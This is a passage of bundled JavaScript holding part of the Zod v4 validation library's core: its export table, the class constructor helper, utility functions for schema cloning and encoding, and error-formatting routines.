  safeEncodeAsync: () => safeEncodeAsync3,
  safeEncode: () => safeEncode3,
  safeDecodeAsync: () => safeDecodeAsync3,
  safeDecode: () => safeDecode3,
  registry: () => registry2,
  regexes: () => exports_regexes2,
  prettifyError: () => prettifyError2,
  parseAsync: () => parseAsync3,
  parse: () => parse5,
  locales: () => exports_locales2,
  isValidJWT: () => isValidJWT2,
  isValidBase64URL: () => isValidBase64URL2,
  isValidBase64: () => isValidBase642,
  globalRegistry: () => globalRegistry2,
  globalConfig: () => globalConfig2,
  formatError: () => formatError2,
  flattenError: () => flattenError2,
  encodeAsync: () => encodeAsync3,
  encode: () => encode3,
  decodeAsync: () => decodeAsync3,
  decode: () => decode3,
  config: () => config2,
  clone: () => clone2,
  _xid: () => _xid2,
  _void: () => _void3,
  _uuidv7: () => _uuidv72,
  _uuidv6: () => _uuidv62,
  _uuidv4: () => _uuidv42,
  _uuid: () => _uuid2,
  _url: () => _url2,
  _uppercase: () => _uppercase2,
  _unknown: () => _unknown2,
  _union: () => _union2,
  _undefined: () => _undefined5,
  _ulid: () => _ulid2,
  _uint64: () => _uint642,
  _uint32: () => _uint322,
  _tuple: () => _tuple2,
  _trim: () => _trim2,
  _transform: () => _transform2,
  _toUpperCase: () => _toUpperCase2,
  _toLowerCase: () => _toLowerCase2,
  _templateLiteral: () => _templateLiteral2,
  _symbol: () => _symbol2,
  _superRefine: () => _superRefine2,
  _success: () => _success2,
  _stringbool: () => _stringbool2,
  _stringFormat: () => _stringFormat2,
  _string: () => _string2,
  _startsWith: () => _startsWith2,
  _size: () => _size2,
  _set: () => _set2,
  _safeParseAsync: () => _safeParseAsync2,
  _safeParse: () => _safeParse2,
  _safeEncodeAsync: () => _safeEncodeAsync2,
  _safeEncode: () => _safeEncode2,
  _safeDecodeAsync: () => _safeDecodeAsync2,
  _safeDecode: () => _safeDecode2,
  _regex: () => _regex2,
  _refine: () => _refine2,
  _record: () => _record2,
  _readonly: () => _readonly2,
  _property: () => _property2,
  _promise: () => _promise2,
  _positive: () => _positive2,
  _pipe: () => _pipe2,
  _parseAsync: () => _parseAsync2,
  _parse: () => _parse2,
  _overwrite: () => _overwrite2,
  _optional: () => _optional2,
  _number: () => _number2,
  _nullable: () => _nullable2,
  _null: () => _null5,
  _normalize: () => _normalize2,
  _nonpositive: () => _nonpositive2,
  _nonoptional: () => _nonoptional2,
  _nonnegative: () => _nonnegative2,
  _never: () => _never2,
  _negative: () => _negative2,
  _nativeEnum: () => _nativeEnum2,
  _nanoid: () => _nanoid2,
  _nan: () => _nan2,
  _multipleOf: () => _multipleOf2,
  _minSize: () => _minSize2,
  _minLength: () => _minLength2,
  _min: () => _gte2,
  _mime: () => _mime2,
  _maxSize: () => _maxSize2,
  _maxLength: () => _maxLength2,
  _max: () => _lte2,
  _map: () => _map2,
  _lte: () => _lte2,
  _lt: () => _lt2,
  _lowercase: () => _lowercase2,
  _literal: () => _literal2,
  _length: () => _length2,
  _lazy: () => _lazy2,
  _ksuid: () => _ksuid2,
  _jwt: () => _jwt2,
  _isoTime: () => _isoTime2,
  _isoDuration: () => _isoDuration2,
  _isoDateTime: () => _isoDateTime2,
  _isoDate: () => _isoDate2,
  _ipv6: () => _ipv62,
  _ipv4: () => _ipv42,
  _intersection: () => _intersection2,
  _int64: () => _int642,
  _int32: () => _int322,
  _int: () => _int2,
  _includes: () => _includes2,
  _guid: () => _guid2,
  _gte: () => _gte2,
  _gt: () => _gt2,
  _float64: () => _float642,
  _float32: () => _float322,
  _file: () => _file2,
  _enum: () => _enum3,
  _endsWith: () => _endsWith2,
  _encodeAsync: () => _encodeAsync2,
  _encode: () => _encode2,
  _emoji: () => _emoji4,
  _email: () => _email2,
  _e164: () => _e1642,
  _discriminatedUnion: () => _discriminatedUnion2,
  _default: () => _default3,
  _decodeAsync: () => _decodeAsync2,
  _decode: () => _decode2,
  _date: () => _date2,
  _custom: () => _custom2,
  _cuid2: () => _cuid22,
  _cuid: () => _cuid3,
  _coercedString: () => _coercedString2,
  _coercedNumber: () => _coercedNumber2,
  _coercedDate: () => _coercedDate2,
  _coercedBoolean: () => _coercedBoolean2,
  _coercedBigint: () => _coercedBigint2,
  _cidrv6: () => _cidrv62,
  _cidrv4: () => _cidrv42,
  _check: () => _check2,
  _catch: () => _catch3,
  _boolean: () => _boolean2,
  _bigint: () => _bigint2,
  _base64url: () => _base64url2,
  _base64: () => _base642,
  _array: () => _array2,
  _any: () => _any2,
  TimePrecision: () => TimePrecision2,
  NEVER: () => NEVER2,
  JSONSchemaGenerator: () => JSONSchemaGenerator2,
  JSONSchema: () => exports_json_schema2,
  Doc: () => Doc2,
  $output: () => $output2,
  $input: () => $input2,
  $constructor: () => $constructor2,
  $brand: () => $brand2,
  $ZodXID: () => $ZodXID2,
  $ZodVoid: () => $ZodVoid2,
  $ZodUnknown: () => $ZodUnknown2,
  $ZodUnion: () => $ZodUnion2,
  $ZodUndefined: () => $ZodUndefined2,
  $ZodUUID: () => $ZodUUID2,
  $ZodURL: () => $ZodURL2,
  $ZodULID: () => $ZodULID2,
  $ZodType: () => $ZodType2,
  $ZodTuple: () => $ZodTuple2,
  $ZodTransform: () => $ZodTransform2,
  $ZodTemplateLiteral: () => $ZodTemplateLiteral2,
  $ZodSymbol: () => $ZodSymbol2,
  $ZodSuccess: () => $ZodSuccess2,
  $ZodStringFormat: () => $ZodStringFormat2,
  $ZodString: () => $ZodString2,
  $ZodSet: () => $ZodSet2,
  $ZodRegistry: () => $ZodRegistry2,
  $ZodRecord: () => $ZodRecord2,
  $ZodRealError: () => $ZodRealError2,
  $ZodReadonly: () => $ZodReadonly2,
  $ZodPromise: () => $ZodPromise2,
  $ZodPrefault: () => $ZodPrefault2,
  $ZodPipe: () => $ZodPipe2,
  $ZodOptional: () => $ZodOptional2,
  $ZodObjectJIT: () => $ZodObjectJIT2,
  $ZodObject: () => $ZodObject2,
  $ZodNumberFormat: () => $ZodNumberFormat2,
  $ZodNumber: () => $ZodNumber2,
  $ZodNullable: () => $ZodNullable2,
  $ZodNull: () => $ZodNull2,
  $ZodNonOptional: () => $ZodNonOptional2,
  $ZodNever: () => $ZodNever2,
  $ZodNanoID: () => $ZodNanoID2,
  $ZodNaN: () => $ZodNaN2,
  $ZodMap: () => $ZodMap2,
  $ZodLiteral: () => $ZodLiteral2,
  $ZodLazy: () => $ZodLazy2,
  $ZodKSUID: () => $ZodKSUID2,
  $ZodJWT: () => $ZodJWT2,
  $ZodIntersection: () => $ZodIntersection2,
  $ZodISOTime: () => $ZodISOTime2,
  $ZodISODuration: () => $ZodISODuration2,
  $ZodISODateTime: () => $ZodISODateTime2,
  $ZodISODate: () => $ZodISODate2,
  $ZodIPv6: () => $ZodIPv62,
  $ZodIPv4: () => $ZodIPv42,
  $ZodGUID: () => $ZodGUID2,
  $ZodFunction: () => $ZodFunction2,
  $ZodFile: () => $ZodFile2,
  $ZodError: () => $ZodError2,
  $ZodEnum: () => $ZodEnum2,
  $ZodEncodeError: () => $ZodEncodeError2,
  $ZodEmoji: () => $ZodEmoji2,
  $ZodEmail: () => $ZodEmail2,
  $ZodE164: () => $ZodE1642,
  $ZodDiscriminatedUnion: () => $ZodDiscriminatedUnion2,
  $ZodDefault: () => $ZodDefault2,
  $ZodDate: () => $ZodDate2,
  $ZodCustomStringFormat: () => $ZodCustomStringFormat2,
  $ZodCustom: () => $ZodCustom2,
  $ZodCodec: () => $ZodCodec2,
  $ZodCheckUpperCase: () => $ZodCheckUpperCase2,
  $ZodCheckStringFormat: () => $ZodCheckStringFormat2,
  $ZodCheckStartsWith: () => $ZodCheckStartsWith2,
  $ZodCheckSizeEquals: () => $ZodCheckSizeEquals2,
  $ZodCheckRegex: () => $ZodCheckRegex2,
  $ZodCheckProperty: () => $ZodCheckProperty2,
  $ZodCheckOverwrite: () => $ZodCheckOverwrite2,
  $ZodCheckNumberFormat: () => $ZodCheckNumberFormat2,
  $ZodCheckMultipleOf: () => $ZodCheckMultipleOf2,
  $ZodCheckMinSize: () => $ZodCheckMinSize2,
  $ZodCheckMinLength: () => $ZodCheckMinLength2,
  $ZodCheckMimeType: () => $ZodCheckMimeType2,
  $ZodCheckMaxSize: () => $ZodCheckMaxSize2,
  $ZodCheckMaxLength: () => $ZodCheckMaxLength2,
  $ZodCheckLowerCase: () => $ZodCheckLowerCase2,
  $ZodCheckLessThan: () => $ZodCheckLessThan2,
  $ZodCheckLengthEquals: () => $ZodCheckLengthEquals2,
  $ZodCheckIncludes: () => $ZodCheckIncludes2,
  $ZodCheckGreaterThan: () => $ZodCheckGreaterThan2,
  $ZodCheckEndsWith: () => $ZodCheckEndsWith2,
  $ZodCheckBigIntFormat: () => $ZodCheckBigIntFormat2,
  $ZodCheck: () => $ZodCheck2,
  $ZodCatch: () => $ZodCatch2,
  $ZodCUID2: () => $ZodCUID22,
  $ZodCUID: () => $ZodCUID3,
  $ZodCIDRv6: () => $ZodCIDRv62,
  $ZodCIDRv4: () => $ZodCIDRv42,
  $ZodBoolean: () => $ZodBoolean2,
  $ZodBigIntFormat: () => $ZodBigIntFormat2,
  $ZodBigInt: () => $ZodBigInt2,
  $ZodBase64URL: () => $ZodBase64URL2,
  $ZodBase64: () => $ZodBase642,
  $ZodAsyncError: () => $ZodAsyncError2,
  $ZodArray: () => $ZodArray2,
  $ZodAny: () => $ZodAny2
});

// node_modules/@opencode-ai/plugin/node_modules/zod/v4/core/core.js
var NEVER2 = Object.freeze({
  status: "aborted"
});
function $constructor2(name, initializer3, params) {
  function init(inst, def) {
    var _a2;
    Object.defineProperty(inst, "_zod", {
      value: inst._zod ?? {},
      enumerable: false
    });
    (_a2 = inst._zod).traits ?? (_a2.traits = new Set);
    inst._zod.traits.add(name);
    initializer3(inst, def);
    for (const k in _.prototype) {
      if (!(k in inst))
        Object.defineProperty(inst, k, { value: _.prototype[k].bind(inst) });
    }
    inst._zod.constr = _;
    inst._zod.def = def;
  }
  const Parent = params?.Parent ?? Object;

  class Definition extends Parent {
  }
  Object.defineProperty(Definition, "name", { value: name });
  function _(def) {
    var _a2;
    const inst = params?.Parent ? new Definition : this;
    init(inst, def);
    (_a2 = inst._zod).deferred ?? (_a2.deferred = []);
    for (const fn of inst._zod.deferred) {
      fn();
    }
    return inst;
  }
  Object.defineProperty(_, "init", { value: init });
  Object.defineProperty(_, Symbol.hasInstance, {
    value: (inst) => {
      if (params?.Parent && inst instanceof params.Parent)
        return true;
      return inst?._zod?.traits?.has(name);
    }
  });
  Object.defineProperty(_, "name", { value: name });
  return _;
}
var $brand2 = Symbol("zod_brand");

class $ZodAsyncError2 extends Error {
  constructor() {
    super(`Encountered Promise during synchronous parse. Use .parseAsync() instead.`);
  }
}

class $ZodEncodeError2 extends Error {
  constructor(name) {
    super(`Encountered unidirectional transform during encode: ${name}`);
    this.name = "ZodEncodeError";
  }
}
var globalConfig2 = {};
function config2(newConfig) {
  if (newConfig)
    Object.assign(globalConfig2, newConfig);
  return globalConfig2;
}
// node_modules/@opencode-ai/plugin/node_modules/zod/v4/core/util.js
var exports_util2 = {};
__export(exports_util2, {
  unwrapMessage: () => unwrapMessage2,
  uint8ArrayToHex: () => uint8ArrayToHex2,
  uint8ArrayToBase64url: () => uint8ArrayToBase64url2,
  uint8ArrayToBase64: () => uint8ArrayToBase642,
  stringifyPrimitive: () => stringifyPrimitive2,
  shallowClone: () => shallowClone2,
  safeExtend: () => safeExtend2,
  required: () => required2,
  randomString: () => randomString2,
  propertyKeyTypes: () => propertyKeyTypes2,
  promiseAllObject: () => promiseAllObject2,
  primitiveTypes: () => primitiveTypes2,
  prefixIssues: () => prefixIssues2,
  pick: () => pick2,
  partial: () => partial2,
  optionalKeys: () => optionalKeys2,
  omit: () => omit2,
  objectClone: () => objectClone2,
  numKeys: () => numKeys2,
  nullish: () => nullish3,
  normalizeParams: () => normalizeParams2,
  mergeDefs: () => mergeDefs2,
  merge: () => merge2,
  jsonStringifyReplacer: () => jsonStringifyReplacer2,
  joinValues: () => joinValues2,
  issue: () => issue2,
  isPlainObject: () => isPlainObject2,
  isObject: () => isObject2,
  hexToUint8Array: () => hexToUint8Array2,
  getSizableOrigin: () => getSizableOrigin2,
  getParsedType: () => getParsedType2,
  getLengthableOrigin: () => getLengthableOrigin2,
  getEnumValues: () => getEnumValues2,
  getElementAtPath: () => getElementAtPath2,
  floatSafeRemainder: () => floatSafeRemainder2,
  finalizeIssue: () => finalizeIssue2,
  extend: () => extend2,
  escapeRegex: () => escapeRegex2,
  esc: () => esc2,
  defineLazy: () => defineLazy2,
  createTransparentProxy: () => createTransparentProxy2,
  cloneDef: () => cloneDef2,
  clone: () => clone2,
  cleanRegex: () => cleanRegex2,
  cleanEnum: () => cleanEnum2,
  captureStackTrace: () => captureStackTrace2,
  cached: () => cached2,
  base64urlToUint8Array: () => base64urlToUint8Array2,
  base64ToUint8Array: () => base64ToUint8Array2,
  assignProp: () => assignProp2,
  assertNotEqual: () => assertNotEqual2,
  assertNever: () => assertNever2,
  assertIs: () => assertIs2,
  assertEqual: () => assertEqual2,
  assert: () => assert2,
  allowsEval: () => allowsEval2,
  aborted: () => aborted2,
  NUMBER_FORMAT_RANGES: () => NUMBER_FORMAT_RANGES2,
  Class: () => Class2,
  BIGINT_FORMAT_RANGES: () => BIGINT_FORMAT_RANGES2
});
function assertEqual2(val) {
  return val;
}
function assertNotEqual2(val) {
  return val;
}
function assertIs2(_arg) {}
function assertNever2(_x) {
  throw new Error;
}
function assert2(_) {}
function getEnumValues2(entries) {
  const numericValues = Object.values(entries).filter((v) => typeof v === "number");
  const values = Object.entries(entries).filter(([k, _]) => numericValues.indexOf(+k) === -1).map(([_, v]) => v);
  return values;
}
function joinValues2(array2, separator = "|") {
  return array2.map((val) => stringifyPrimitive2(val)).join(separator);
}
function jsonStringifyReplacer2(_, value) {
  if (typeof value === "bigint")
    return value.toString();
  return value;
}
function cached2(getter) {
  const set2 = false;
  return {
    get value() {
      if (!set2) {
        const value = getter();
        Object.defineProperty(this, "value", { value });
        return value;
      }
      throw new Error("cached value already set");
    }
  };
}
function nullish3(input) {
  return input === null || input === undefined;
}
function cleanRegex2(source) {
  const start = source.startsWith("^") ? 1 : 0;
  const end = source.endsWith("$") ? source.length - 1 : source.length;
  return source.slice(start, end);
}
function floatSafeRemainder2(val, step) {
  const valDecCount = (val.toString().split(".")[1] || "").length;
  const stepString = step.toString();
  let stepDecCount = (stepString.split(".")[1] || "").length;
  if (stepDecCount === 0 && /\d?e-\d?/.test(stepString)) {
    const match = stepString.match(/\d?e-(\d?)/);
    if (match?.[1]) {
      stepDecCount = Number.parseInt(match[1]);
    }
  }
  const decCount = valDecCount > stepDecCount ? valDecCount : stepDecCount;
  const valInt = Number.parseInt(val.toFixed(decCount).replace(".", ""));
  const stepInt = Number.parseInt(step.toFixed(decCount).replace(".", ""));
  return valInt % stepInt / 10 ** decCount;
}
var EVALUATING2 = Symbol("evaluating");
function defineLazy2(object2, key, getter) {
  let value = undefined;
  Object.defineProperty(object2, key, {
    get() {
      if (value === EVALUATING2) {
        return;
      }
      if (value === undefined) {
        value = EVALUATING2;
        value = getter();
      }
      return value;
    },
    set(v) {
      Object.defineProperty(object2, key, {
        value: v
      });
    },
    configurable: true
  });
}
function objectClone2(obj) {
  return Object.create(Object.getPrototypeOf(obj), Object.getOwnPropertyDescriptors(obj));
}
function assignProp2(target, prop, value) {
  Object.defineProperty(target, prop, {
    value,
    writable: true,
    enumerable: true,
    configurable: true
  });
}
function mergeDefs2(...defs) {
  const mergedDescriptors = {};
  for (const def of defs) {
    const descriptors = Object.getOwnPropertyDescriptors(def);
    Object.assign(mergedDescriptors, descriptors);
  }
  return Object.defineProperties({}, mergedDescriptors);
}
function cloneDef2(schema) {
  return mergeDefs2(schema._zod.def);
}
function getElementAtPath2(obj, path) {
  if (!path)
    return obj;
  return path.reduce((acc, key) => acc?.[key], obj);
}
function promiseAllObject2(promisesObj) {
  const keys = Object.keys(promisesObj);
  const promises = keys.map((key) => promisesObj[key]);
  return Promise.all(promises).then((results) => {
    const resolvedObj = {};
    for (let i = 0;i < keys.length; i++) {
      resolvedObj[keys[i]] = results[i];
    }
    return resolvedObj;
  });
}
function randomString2(length = 10) {
  const chars = "abcdefghijklmnopqrstuvwxyz";
  let str = "";
  for (let i = 0;i < length; i++) {
    str += chars[Math.floor(Math.random() * chars.length)];
  }
  return str;
}
function esc2(str) {
  return JSON.stringify(str);
}
var captureStackTrace2 = "captureStackTrace" in Error ? Error.captureStackTrace : (..._args) => {};
function isObject2(data) {
  return typeof data === "object" && data !== null && !Array.isArray(data);
}
var allowsEval2 = cached2(() => {
  if (typeof navigator !== "undefined" && navigator?.userAgent?.includes("Cloudflare")) {
    return false;
  }
  try {
    const F = Function;
    new F("");
    return true;
  } catch (_) {
    return false;
  }
});
function isPlainObject2(o) {
  if (isObject2(o) === false)
    return false;
  const ctor = o.constructor;
  if (ctor === undefined)
    return true;
  const prot = ctor.prototype;
  if (isObject2(prot) === false)
    return false;
  if (Object.prototype.hasOwnProperty.call(prot, "isPrototypeOf") === false) {
    return false;
  }
  return true;
}
function shallowClone2(o) {
  if (isPlainObject2(o))
    return { ...o };
  if (Array.isArray(o))
    return [...o];
  return o;
}
function numKeys2(data) {
  let keyCount = 0;
  for (const key in data) {
    if (Object.prototype.hasOwnProperty.call(data, key)) {
      keyCount++;
    }
  }
  return keyCount;
}
var getParsedType2 = (data) => {
  const t = typeof data;
  switch (t) {
    case "undefined":
      return "undefined";
    case "string":
      return "string";
    case "number":
      return Number.isNaN(data) ? "nan" : "number";
    case "boolean":
      return "boolean";
    case "function":
      return "function";
    case "bigint":
      return "bigint";
    case "symbol":
      return "symbol";
    case "object":
      if (Array.isArray(data)) {
        return "array";
      }
      if (data === null) {
        return "null";
      }
      if (data.then && typeof data.then === "function" && data.catch && typeof data.catch === "function") {
        return "promise";
      }
      if (typeof Map !== "undefined" && data instanceof Map) {
        return "map";
      }
      if (typeof Set !== "undefined" && data instanceof Set) {
        return "set";
      }
      if (typeof Date !== "undefined" && data instanceof Date) {
        return "date";
      }
      if (typeof File !== "undefined" && data instanceof File) {
        return "file";
      }
      return "object";
    default:
      throw new Error(`Unknown data type: ${t}`);
  }
};
var propertyKeyTypes2 = new Set(["string", "number", "symbol"]);
var primitiveTypes2 = new Set(["string", "number", "bigint", "boolean", "symbol", "undefined"]);
function escapeRegex2(str) {
  return str.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}
function clone2(inst, def, params) {
  const cl = new inst._zod.constr(def ?? inst._zod.def);
  if (!def || params?.parent)
    cl._zod.parent = inst;
  return cl;
}
function normalizeParams2(_params) {
  const params = _params;
  if (!params)
    return {};
  if (typeof params === "string")
    return { error: () => params };
  if (params?.message !== undefined) {
    if (params?.error !== undefined)
      throw new Error("Cannot specify both `message` and `error` params");
    params.error = params.message;
  }
  delete params.message;
  if (typeof params.error === "string")
    return { ...params, error: () => params.error };
  return params;
}
function createTransparentProxy2(getter) {
  let target;
  return new Proxy({}, {
    get(_, prop, receiver) {
      target ?? (target = getter());
      return Reflect.get(target, prop, receiver);
    },
    set(_, prop, value, receiver) {
      target ?? (target = getter());
      return Reflect.set(target, prop, value, receiver);
    },
    has(_, prop) {
      target ?? (target = getter());
      return Reflect.has(target, prop);
    },
    deleteProperty(_, prop) {
      target ?? (target = getter());
      return Reflect.deleteProperty(target, prop);
    },
    ownKeys(_) {
      target ?? (target = getter());
      return Reflect.ownKeys(target);
    },
    getOwnPropertyDescriptor(_, prop) {
      target ?? (target = getter());
      return Reflect.getOwnPropertyDescriptor(target, prop);
    },
    defineProperty(_, prop, descriptor) {
      target ?? (target = getter());
      return Reflect.defineProperty(target, prop, descriptor);
    }
  });
}
function stringifyPrimitive2(value) {
  if (typeof value === "bigint")
    return value.toString() + "n";
  if (typeof value === "string")
    return `"${value}"`;
  return `${value}`;
}
function optionalKeys2(shape) {
  return Object.keys(shape).filter((k) => {
    return shape[k]._zod.optin === "optional" && shape[k]._zod.optout === "optional";
  });
}
var NUMBER_FORMAT_RANGES2 = {
  safeint: [Number.MIN_SAFE_INTEGER, Number.MAX_SAFE_INTEGER],
  int32: [-2147483648, 2147483647],
  uint32: [0, 4294967295],
  float32: [-340282346638528860000000000000000000000, 340282346638528860000000000000000000000],
  float64: [-Number.MAX_VALUE, Number.MAX_VALUE]
};
var BIGINT_FORMAT_RANGES2 = {
  int64: [/* @__PURE__ */ BigInt("-9223372036854775808"), /* @__PURE__ */ BigInt("9223372036854775807")],
  uint64: [/* @__PURE__ */ BigInt(0), /* @__PURE__ */ BigInt("18446744073709551615")]
};
function pick2(schema, mask) {
  const currDef = schema._zod.def;
  const def = mergeDefs2(schema._zod.def, {
    get shape() {
      const newShape = {};
      for (const key in mask) {
        if (!(key in currDef.shape)) {
          throw new Error(`Unrecognized key: "${key}"`);
        }
        if (!mask[key])
          continue;
        newShape[key] = currDef.shape[key];
      }
      assignProp2(this, "shape", newShape);
      return newShape;
    },
    checks: []
  });
  return clone2(schema, def);
}
function omit2(schema, mask) {
  const currDef = schema._zod.def;
  const def = mergeDefs2(schema._zod.def, {
    get shape() {
      const newShape = { ...schema._zod.def.shape };
      for (const key in mask) {
        if (!(key in currDef.shape)) {
          throw new Error(`Unrecognized key: "${key}"`);
        }
        if (!mask[key])
          continue;
        delete newShape[key];
      }
      assignProp2(this, "shape", newShape);
      return newShape;
    },
    checks: []
  });
  return clone2(schema, def);
}
function extend2(schema, shape) {
  if (!isPlainObject2(shape)) {
    throw new Error("Invalid input to extend: expected a plain object");
  }
  const checks3 = schema._zod.def.checks;
  const hasChecks = checks3 && checks3.length > 0;
  if (hasChecks) {
    throw new Error("Object schemas containing refinements cannot be extended. Use `.safeExtend()` instead.");
  }
  const def = mergeDefs2(schema._zod.def, {
    get shape() {
      const _shape = { ...schema._zod.def.shape, ...shape };
      assignProp2(this, "shape", _shape);
      return _shape;
    },
    checks: []
  });
  return clone2(schema, def);
}
function safeExtend2(schema, shape) {
  if (!isPlainObject2(shape)) {
    throw new Error("Invalid input to safeExtend: expected a plain object");
  }
  const def = {
    ...schema._zod.def,
    get shape() {
      const _shape = { ...schema._zod.def.shape, ...shape };
      assignProp2(this, "shape", _shape);
      return _shape;
    },
    checks: schema._zod.def.checks
  };
  return clone2(schema, def);
}
function merge2(a, b) {
  const def = mergeDefs2(a._zod.def, {
    get shape() {
      const _shape = { ...a._zod.def.shape, ...b._zod.def.shape };
      assignProp2(this, "shape", _shape);
      return _shape;
    },
    get catchall() {
      return b._zod.def.catchall;
    },
    checks: []
  });
  return clone2(a, def);
}
function partial2(Class2, schema, mask) {
  const def = mergeDefs2(schema._zod.def, {
    get shape() {
      const oldShape = schema._zod.def.shape;
      const shape = { ...oldShape };
      if (mask) {
        for (const key in mask) {
          if (!(key in oldShape)) {
            throw new Error(`Unrecognized key: "${key}"`);
          }
          if (!mask[key])
            continue;
          shape[key] = Class2 ? new Class2({
            type: "optional",
            innerType: oldShape[key]
          }) : oldShape[key];
        }
      } else {
        for (const key in oldShape) {
          shape[key] = Class2 ? new Class2({
            type: "optional",
            innerType: oldShape[key]
          }) : oldShape[key];
        }
      }
      assignProp2(this, "shape", shape);
      return shape;
    },
    checks: []
  });
  return clone2(schema, def);
}
function required2(Class2, schema, mask) {
  const def = mergeDefs2(schema._zod.def, {
    get shape() {
      const oldShape = schema._zod.def.shape;
      const shape = { ...oldShape };
      if (mask) {
        for (const key in mask) {
          if (!(key in shape)) {
            throw new Error(`Unrecognized key: "${key}"`);
          }
          if (!mask[key])
            continue;
          shape[key] = new Class2({
            type: "nonoptional",
            innerType: oldShape[key]
          });
        }
      } else {
        for (const key in oldShape) {
          shape[key] = new Class2({
            type: "nonoptional",
            innerType: oldShape[key]
          });
        }
      }
      assignProp2(this, "shape", shape);
      return shape;
    },
    checks: []
  });
  return clone2(schema, def);
}
function aborted2(x, startIndex = 0) {
  if (x.aborted === true)
    return true;
  for (let i = startIndex;i < x.issues.length; i++) {
    if (x.issues[i]?.continue !== true) {
      return true;
    }
  }
  return false;
}
function prefixIssues2(path, issues) {
  return issues.map((iss) => {
    var _a2;
    (_a2 = iss).path ?? (_a2.path = []);
    iss.path.unshift(path);
    return iss;
  });
}
function unwrapMessage2(message) {
  return typeof message === "string" ? message : message?.message;
}
function finalizeIssue2(iss, ctx, config3) {
  const full = { ...iss, path: iss.path ?? [] };
  if (!iss.message) {
    const message = unwrapMessage2(iss.inst?._zod.def?.error?.(iss)) ?? unwrapMessage2(ctx?.error?.(iss)) ?? unwrapMessage2(config3.customError?.(iss)) ?? unwrapMessage2(config3.localeError?.(iss)) ?? "Invalid input";
    full.message = message;
  }
  delete full.inst;
  delete full.continue;
  if (!ctx?.reportInput) {
    delete full.input;
  }
  return full;
}
function getSizableOrigin2(input) {
  if (input instanceof Set)
    return "set";
  if (input instanceof Map)
    return "map";
  if (input instanceof File)
    return "file";
  return "unknown";
}
function getLengthableOrigin2(input) {
  if (Array.isArray(input))
    return "array";
  if (typeof input === "string")
    return "string";
  return "unknown";
}
function issue2(...args) {
  const [iss, input, inst] = args;
  if (typeof iss === "string") {
    return {
      message: iss,
      code: "custom",
      input,
      inst
    };
  }
  return { ...iss };
}
function cleanEnum2(obj) {
  return Object.entries(obj).filter(([k, _]) => {
    return Number.isNaN(Number.parseInt(k, 10));
  }).map((el) => el[1]);
}
function base64ToUint8Array2(base643) {
  const binaryString = atob(base643);
  const bytes = new Uint8Array(binaryString.length);
  for (let i = 0;i < binaryString.length; i++) {
    bytes[i] = binaryString.charCodeAt(i);
  }
  return bytes;
}
function uint8ArrayToBase642(bytes) {
  let binaryString = "";
  for (let i = 0;i < bytes.length; i++) {
    binaryString += String.fromCharCode(bytes[i]);
  }
  return btoa(binaryString);
}
function base64urlToUint8Array2(base64url3) {
  const base643 = base64url3.replace(/-/g, "+").replace(/_/g, "/");
  const padding = "=".repeat((4 - base643.length % 4) % 4);
  return base64ToUint8Array2(base643 + padding);
}
function uint8ArrayToBase64url2(bytes) {
  return uint8ArrayToBase642(bytes).replace(/\+/g, "-").replace(/\//g, "_").replace(/=/g, "");
}
function hexToUint8Array2(hex3) {
  const cleanHex = hex3.replace(/^0x/, "");
  if (cleanHex.length % 2 !== 0) {
    throw new Error("Invalid hex string length");
  }
  const bytes = new Uint8Array(cleanHex.length / 2);
  for (let i = 0;i < cleanHex.length; i += 2) {
    bytes[i / 2] = Number.parseInt(cleanHex.slice(i, i + 2), 16);
  }
  return bytes;
}
function uint8ArrayToHex2(bytes) {
  return Array.from(bytes).map((b) => b.toString(16).padStart(2, "0")).join("");
}

class Class2 {
  constructor(..._args) {}
}

// node_modules/@opencode-ai/plugin/node_modules/zod/v4/core/errors.js
var initializer3 = (inst, def) => {
  inst.name = "$ZodError";
  Object.defineProperty(inst, "_zod", {
    value: inst._zod,
    enumerable: false
  });
  Object.defineProperty(inst, "issues", {
    value: def,
    enumerable: false
  });
  inst.message = JSON.stringify(def, jsonStringifyReplacer2, 2);
  Object.defineProperty(inst, "toString", {
    value: () => inst.message,
    enumerable: false
  });
};
var $ZodError2 = $constructor2("$ZodError", initializer3);
var $ZodRealError2 = $constructor2("$ZodError", initializer3, { Parent: Error });
function flattenError2(error48, mapper = (issue3) => issue3.message) {
  const fieldErrors = {};
  const formErrors = [];
  for (const sub of error48.issues) {
    if (sub.path.length > 0) {
      fieldErrors[sub.path[0]] = fieldErrors[sub.path[0]] || [];
      fieldErrors[sub.path[0]].push(mapper(sub));
    } else {
      formErrors.push(mapper(sub));
    }
  }
  return { formErrors, fieldErrors };
}
function formatError2(error48, _mapper) {
  const mapper = _mapper || function(issue3) {
    return issue3.message;
  };
  const fieldErrors = { _errors: [] };
  const processError = (error49) => {
    for (const issue3 of error49.issues) {
      if (issue3.code === "invalid_union" && issue3.errors.length) {
        issue3.errors.map((issues) => processError({ issues }));
      } else if (issue3.code === "invalid_key") {
        processError({ issues: issue3.issues });
      } else if (issue3.code === "invalid_element") {
        processError({ issues: issue3.issues });
      } else if (issue3.path.length === 0) {
        fieldErrors._errors.push(mapper(issue3));
      } else {
        let curr = fieldErrors;
        let i = 0;
        while (i < issue3.path.length) {
          const el = issue3.path[i];
          const terminal = i === issue3.path.length - 1;
          if (!terminal) {
            curr[el] = curr[el] || { _errors: [] };
          } else {
            curr[el] = curr[el] || { _errors: [] };
            curr[el]._errors.push(mapper(issue3));
          }
          curr = curr[el];
          i++;
        }
      }
    }
  };
  processError(error48);
  return fieldErrors;
}
function treeifyError2(error48, _mapper) {
  const mapper = _mapper || function(issue3) {
    return issue3.message;
  };
  const result = { errors: [] };
  const processError = (error49, path = []) => {
    var _a2, _b;
    for (const issue3 of error49.issues) {
      if (issue3.code === "invalid_union" && issue3.errors.length) {
        issue3.errors.map((issues) => processError({ issues }, issue3.path));
      } else if (issue3.code === "invalid_key") {
        processError({ issues: issue3.issues }, issue3.path);
      } else if (issue3.code === "invalid_element") {
        processError({ issues: issue3.issues }, issue3.path);
      } else {
        const fullpath = [...path, ...issue3.path];
        if (fullpath.length === 0) {
          result.errors.push(mapper(issue3));
          continue;
        }
        let curr = result;
        let i = 0;
        while (i < fullpath.length) {
          const el = fullpath[i];
          const terminal = i === fullpath.length - 1;
          if (typeof el === "string") {
            curr.properties ?? (curr.properties = {});
            (_a2 = curr.properties)[el] ?? (_a2[el] = { errors: [] });
            curr = curr.properties[el];
          } else {
            curr.items ?? (curr.items = []);
            (_b = curr.items)[el] ?? (_b[el] = { errors: [] });
            curr = curr.items[el];
          }
          if (terminal) {
            curr.errors.push(mapper(issue3));
          }
          i++;
        }
      }
    }
  };
  processError(error48);
  return result;
}
function toDotPath2(_path) {
  const segs = [];
